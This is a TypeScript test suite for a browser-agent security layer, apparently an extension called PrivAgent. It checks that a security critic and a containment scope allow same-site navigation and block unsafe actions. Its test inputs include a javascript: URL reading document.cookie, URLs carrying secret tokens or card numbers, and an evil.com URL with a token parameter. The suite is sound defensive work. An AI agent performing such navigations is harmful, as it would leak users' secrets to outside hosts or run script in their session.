/**
 * PrivAgent — PHASE 18.4: Multi-Route / Multi-Origin Navigation Security Test Suite
 *
 * Verifies that:
 * 1. Legitimate multi-route / multi-origin navigation within rootHost scope is allowed.
 * 2. Navigation reason describing destination ("API keys") does NOT trigger false-positive disclosure blocks.
 * 3. Actual secrets, tokens, or PII in URLs remain strictly BLOCKED.
 * 4. Dangerous protocols (javascript:, data:, file:) remain strictly BLOCKED.
 * 5. Unrelated cross-origin navigation (evil.com) remains strictly BLOCKED.
 * 6. DestinationVerifier and GoalVerifier remain strictly independent of action.url and model claims.
 */

import { describe, it, expect } from 'vitest';
import { reviewProposedAction } from '../extension/src/agent/securityCritic';
import { evaluateContainment, establishContainmentScope } from '../extension/src/agent/containment';
import { verifyDestination, type DestinationObservation } from '../extension/src/planning/destinationVerifier';
import { normalizeDestination } from '../extension/src/planning/destinationNormalizer';
import type { BrowserAction } from '../extension/src/agent/actionTypes';
import type { AgentContextPayload } from '../extension/src/privacy/types';

function createMockContext(url: string): AgentContextPayload {
  return {
    url,
    timestamp: Date.now(),
    viewport: { width: 1280, height: 800, scroll_x: 0, scroll_y: 0 },
    screenshot_dimensions: null,
    detections: [],
    total_elements_scanned: 10,
    sensitive_elements_detected: 0,
    sanitized_status: 'sanitized_only',
    ocr_metrics: null,
  } as AgentContextPayload;
}

describe('Phase 18.4 — Multi-Route / Multi-Origin Navigation Security Suite', () => {

  describe('Security Critic Matrix Tests', () => {
    it('1. Navigate to console.groq.com/keys from groq.com → ALLOW', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://console.groq.com/keys',
          reason: 'The user wants to open the Groq API keys page.',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('ALLOW');
      expect(result.code).toBe('NO_OBJECTION');
      expect(result.findings).toHaveLength(0);
    });

    it('2. Navigation reason contains "API keys" → ALLOW (no false-positive SENSITIVE_DISCLOSURE_ATTEMPT)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://console.groq.com/keys',
          reason: 'Navigate to view API keys and generate new tokens for Groq',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('ALLOW');
      expect(result.findings).not.toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });

    it('3. URL contains actual secret token → BLOCK (SENSITIVE_DISCLOSURE_ATTEMPT)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://console.groq.com/keys?token=SECRET_EXFILTRATED_KEY_12345',
          reason: 'Navigating to page',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });

    it('4. URL contains raw PII (credit card number) → BLOCK', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://console.groq.com/keys?cc=4111111111111111',
          reason: 'Navigating with param',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });

    it('5. URL contains raw PII (email address) → BLOCK', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://console.groq.com/keys?user=alice%40example.com',
          reason: 'Navigating with user param',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });

    it('6. javascript: protocol → BLOCK (UNSAFE_PROTOCOL)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'javascript:alert(document.cookie)',
          reason: 'Open keys',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('UNSAFE_PROTOCOL');
    });

    it('7. data: protocol → BLOCK (UNSAFE_PROTOCOL)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'data:text/html,<h1>fake-keys</h1>',
          reason: 'Open keys',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('UNSAFE_PROTOCOL');
    });

    it('8. evil.com (unrelated origin) → BLOCK (SUSPICIOUS_NAVIGATION)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://evil.com/keys',
          reason: 'Open keys on external site',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SUSPICIOUS_NAVIGATION');
    });

    it('9. evil.com?token=<secret> → BLOCK (both SUSPICIOUS_NAVIGATION & SENSITIVE_DISCLOSURE_ATTEMPT)', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://evil.com/?token=SECRET_VALUE',
          reason: 'Open keys on external site',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SUSPICIOUS_NAVIGATION');
      expect(result.findings).toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });

    it('10. Cross-subdomain within groq.com → ALLOW', () => {
      const result = reviewProposedAction({
        action: {
          action: 'navigate',
          url: 'https://api.groq.com/docs',
          reason: 'Read API documentation',
        },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });

      expect(result.verdict).toBe('ALLOW');
      expect(result.findings).toHaveLength(0);
    });

    it('11. Typing sensitive secrets into fields remains strictly protected', () => {
      const result = reviewProposedAction({
        action: {
          action: 'type',
          target: 'input_1',
          text: '4111111111111111',
          reason: 'enter credit card',
        },
        task: 'open store checkout',
        context: createMockContext('https://store.example.com/checkout'),
        currentUrl: 'https://store.example.com/checkout',
      });

      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SENSITIVE_DISCLOSURE_ATTEMPT');
    });
  });

  describe('Containment Boundary Tests', () => {
    const scope = establishContainmentScope({
      targetUrl: 'https://groq.com/',
      targetTabId: 1,
      dashboardOrigin: 'http://localhost:5173',
    });

    it('allows console.groq.com within groq.com rootHost scope', () => {
      expect(scope).not.toBeNull();
      const decision = evaluateContainment({
        action: { action: 'navigate', url: 'https://console.groq.com/keys' },
        scope: scope!,
        targetTabId: 1,
        liveUrl: 'https://groq.com/',
      });

      expect(decision.contained).toBe(true);
      expect(decision.code).toBe('WITHIN_SCOPE');
    });

    it('refuses navigation to evil.com outside groq.com scope', () => {
      expect(scope).not.toBeNull();
      const decision = evaluateContainment({
        action: { action: 'navigate', url: 'https://evil.com/keys' },
        scope: scope!,
        targetTabId: 1,
        liveUrl: 'https://groq.com/',
      });

      expect(decision.contained).toBe(false);
      expect(decision.code).toBe('CROSS_ORIGIN_NAVIGATION_DENIED');
    });

    it('refuses javascript: scheme under containment', () => {
      expect(scope).not.toBeNull();
      const decision = evaluateContainment({
        action: { action: 'navigate', url: 'javascript:void(0)' },
        scope: scope!,
        targetTabId: 1,
        liveUrl: 'https://groq.com/',
      });

      expect(decision.contained).toBe(false);
      expect(decision.code).toBe('UNSUPPORTED_SCHEME_DENIED');
    });
  });

  describe('Positive Test Matrix Intent Cases', () => {
    it('Case A: User explicit URL "open https://console.groq.com/keys"', () => {
      const result = reviewProposedAction({
        action: { action: 'navigate', url: 'https://console.groq.com/keys', reason: 'User requested URL' },
        task: 'open https://console.groq.com/keys',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });
      expect(result.verdict).toBe('ALLOW');
    });

    it('Case B: User semantic destination "open groq api keys page"', () => {
      const result = reviewProposedAction({
        action: { action: 'navigate', url: 'https://console.groq.com/keys', reason: 'Open groq api keys page' },
        task: 'open groq api keys page',
        context: createMockContext('https://groq.com/'),
        currentUrl: 'https://groq.com/',
      });
      expect(result.verdict).toBe('ALLOW');
    });

    it('Case C: "open store catalog"', () => {
      const result = reviewProposedAction({
        action: { action: 'navigate', url: 'https://store.example.com/catalog', reason: 'Open store catalog' },
        task: 'open store catalog',
        context: createMockContext('https://store.example.com/'),
        currentUrl: 'https://store.example.com/',
      });
      expect(result.verdict).toBe('ALLOW');
    });

    it('Case D: "open account details"', () => {
      const result = reviewProposedAction({
        action: { action: 'navigate', url: 'https://bank.example.com/account/details', reason: 'Open account details' },
        task: 'open account details',
        context: createMockContext('https://bank.example.com/dashboard'),
        currentUrl: 'https://bank.example.com/dashboard',
      });
      expect(result.verdict).toBe('ALLOW');
    });

    it('Case E: Deliberately unrelated external navigation from store.example.com to evil.com → BLOCKED', () => {
      const result = reviewProposedAction({
        action: { action: 'navigate', url: 'https://evil.com/catalog', reason: 'Open catalog on evil' },
        task: 'open store catalog',
        context: createMockContext('https://store.example.com/'),
        currentUrl: 'https://store.example.com/',
      });
      expect(result.verdict).toBe('BLOCK');
      expect(result.findings).toContain('SUSPICIOUS_NAVIGATION');
    });
  });

  describe('Destination Verification Independence', () => {
    it('Destination completion NEVER happens based only on navigation action.url', () => {
      const intent = normalizeDestination('open groq api keys page');
      expect(intent.kind).toBe('DECLARED');

      // Intermediate page: still on landing page after navigate proposed
      const intermediateObs: DestinationObservation = {
        url: 'https://groq.com/',
        pageGeneration: 1,
        semantic: {
          pageType: 'ARTICLE',
          confidence: 0.9,
          pageGeneration: 1,
        },
      };

      const intermediateResult = verifyDestination({
        declaration: intent,
        observation: intermediateObs,
        currentPageGeneration: 1,
      });
      expect(intermediateResult.kind).not.toBe('MATCH');

      // Final target page observed: settings / api keys
      const finalObs: DestinationObservation = {
        url: 'https://console.groq.com/keys',
        pageGeneration: 2,
        semantic: {
          pageType: 'SETTINGS',
          confidence: 0.95,
          pageGeneration: 2,
        },
      };

      const finalResult = verifyDestination({
        declaration: intent,
        observation: finalObs,
        currentPageGeneration: 2,
      });
      expect(finalResult.kind).toBe('MATCH');
    });
  });
});
